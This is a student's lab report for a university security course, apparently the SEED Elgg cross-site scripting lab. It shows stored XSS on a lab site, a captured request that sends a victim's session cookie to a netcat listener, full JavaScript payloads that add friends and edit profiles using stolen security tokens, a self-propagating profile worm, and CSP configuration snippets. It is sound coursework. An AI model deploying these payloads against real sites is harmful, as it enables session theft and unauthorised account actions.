## Lab05
###### Lin Shi (n92s773)
###### linshi1768@gmail.com
###### CSCI 476
###### March 2, 2021
<br>


### Task 1:
This task carries out a XSS attack by adding some javascript code in one's profile, I decided to use Alice for this:
![attack](Task1-1.PNG)

After I saved the update, it is going to bring me to Alice's home page and I saw:
![success](Task1-2.PNG)
This proves that our attack was success. On the other hand, I have tried many other spots to insert the javascript code. For example, if I just add the javascript code in About me, without going into the Edit HTML option, the attack was unsuccesful since that is being treated as a paragraph and characters like "<" and ">" has been converted. Spots such as the email require something in the form of an email; thus, it will not allow me to update it with a javascript code. Overall, I have carried out the attack in many different spots such as Brief description and About me (when I am under Edit HTML option).

### Task 2:
In this task, I am trying to carry out show that I could get the cookie information and not just a random popup that does not have any sensative informations:

![attack](Task2-1.PNG)

Just like last time, I saved it and it will bring me to the profile page:
![success](Task2-2.PNG)
Similar to last time, a popup appeared. However, it is displaying the cookie information instead of a message. Similar to last time, I tried the code in different fields and everything was the same as last time.

### Task 3:
Although task 2 was cool, the cookie information is displayed to the victim, so the attacker could not actually see the information to do any damage. This time, we are trying to pass the cookie information to the attack's machine:
![attack](Task3-1.PNG)
```
[03/10/21]seed@VM:~/.../lab05$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.4 33100
GET /?c=Elgg%3Dsjf4dg71i0hbrpvj34sl8b78uo HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.xsslabelgg.com/profile/alice
```
This time, the attacker, netcat, is waiting on port 5555 for the response. In our javascript code, we included a image tag that tells it to go the location, which is our local host this time, and in port 5555. However, the cookie information is passed to the location while Elgg request for the "image". Therefore, we have recieved the cookie infomation on the attack's end.


### Task 4:

##### Task 4.1:
In this task, I am trying to carry out an attack that will add Samy as a friend when his profile is view by anyone. First, I did a regular add friend and used burp suite to find the information I need.
```
GET /action/friends/add?friend=59&__elgg_ts=1615407806&__elgg_token=9l5ZkOx6YH-W4EjfXoGmaQ&__elgg_ts=1615407806&__elgg_token=9l5ZkOx6YH-W4EjfXoGmaQ HTTP/1.1
Host: www.xsslabelgg.com
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://www.xsslabelgg.com/profile/samy
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=084bm4flu0uc2980g85k5q8s9f
Connection: close
```

In the code, we can see the elgg_token and elgg_ts being found for us. Thus, we need to use the other information to try to make the sendurl as closely as possible. Through the information above, we found the host (www.xsslabelgg.com), the location where the action of adding a friend is located (/action/friends/add), and Samy's guid (59). Then we are just added everything up to form our sendurl. Then I included the JavaScript code in about me in Edit HTML.
```
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;

    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          
    var token="&__elgg_token="+elgg.security.token.__elgg_token; 

    var sendurl="http://www.xsslabelgg.com/action/friends/add" + "?friend=59" + token + ts;  

    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}
</script>
```
![attack](Task4-1-1.PNG)

Then I made sure Samy and Alice are not friends. [verify](Task4-1-2.PNG)
Next I searched for Samy as Alice [search](Task4-1-3.png)

##### Task 4.2:

```
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;

    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;          
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    var sendurl="http://www.xsslabelgg.com/action/friends/remove" + "?friend=59" + token + ts;  

    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}
</script>
```

### Task 5:

##### Task 5.1:
```
POST /action/profile/edit HTTP/1.1

Host: www.xsslabelgg.com

Content-Length: 2536

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://www.xsslabelgg.com

Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywTWFRbcqOckh4hVo

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://www.xsslabelgg.com/profile/samy/edit
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: Elgg=sir4peeb54gafb385vs1l6fnpt
Connection: close
------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="__elgg_token"
hlaPgUV7HjfhLOIUsQfU1Q

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="__elgg_ts"
1615410743

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="name"
Samy

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="description"
<p>This is a test</p>

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[description]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="briefdescription"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[briefdescription]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="location"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[location]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="interests"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[interests]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="skills"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[skills]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="contactemail"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[contactemail]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="phone"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[phone]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="mobile"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[mobile]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="website"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[website]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="twitter"

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="accesslevel[twitter]"
2

------WebKitFormBoundarywTWFRbcqOckh4hVo
Content-Disposition: form-data; name="guid"
59

------WebKitFormBoundarywTWFRbcqOckh4hVo--

```

```
<script type="text/javascript">
window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var userName=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;
    var desc = "&description=Samy is my hero" + "&accesslevel[description] = 2";

    // Construct the content of your url.
    var content=token+ts+"&name=" + userName + desc + guid;     //FILL IN
    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
    var samyGuid=59;   
    if (elgg.session.user.guid!=samyGuid)       // (1)
    {
        // Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>

```


### Task 6:
```
<script type="text/javascript" id="worm">
window.onload = function(){
  var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";                                 

  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

  var desc = "&description=Samy is my hero" + wormCode;
  desc    += "&accesslevel[description]=2";                       


  var name = "&name=" + elgg.session.user.name;
  var guid = "&guid=" + elgg.session.user.guid;
  var ts    = "&__elgg_ts="+elgg.security.token.__elgg_ts;
  var token = "&__elgg_token="+elgg.security.token.__elgg_token;


  var sendurl="http://www.xsslabelgg.com/action/profile/edit";
  var content = token + ts + name + desc + guid;

  samyGuid = 59;
  if (elgg.session.user.guid != samyGuid){

    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl,true);
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send(content);

    sendurl = "http://www.xsslabelgg.com/action/friends/add" + "?friend=59" + token + ts;
    var Ajax=null;
    Ajax = new XMLHttpRequest();
    Ajax.open("GET", sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type",
                          "application/x-www-form-urlencoded");
    Ajax.send();

  }
}
```


### Task 7:

##### Task 7.1:


##### Task 7.2:


##### Task 7.3:
```
# Purpose: Setting CSP policies in Apache configuration
<VirtualHost *:80>
    DocumentRoot /var/www/csp
    ServerName www.example32b.com
    DirectoryIndex index.html
    Header set Content-Security-Policy " \
             default-src 'self'; \
             script-src 'self' *.example70.com *.example60.com \
           "
</VirtualHost>
```


##### Task 7.4:
```
<?php
  $cspheader = "Content-Security-Policy:".
               "default-src 'self';".
               "script-src 'self' 'nonce-111-111-111' 'nonce-222-222-222' *.example70.com *.example60.com".
               "";
  header($cspheader);
?>

<?php include 'index.html';?>
```


##### Task 7.5:
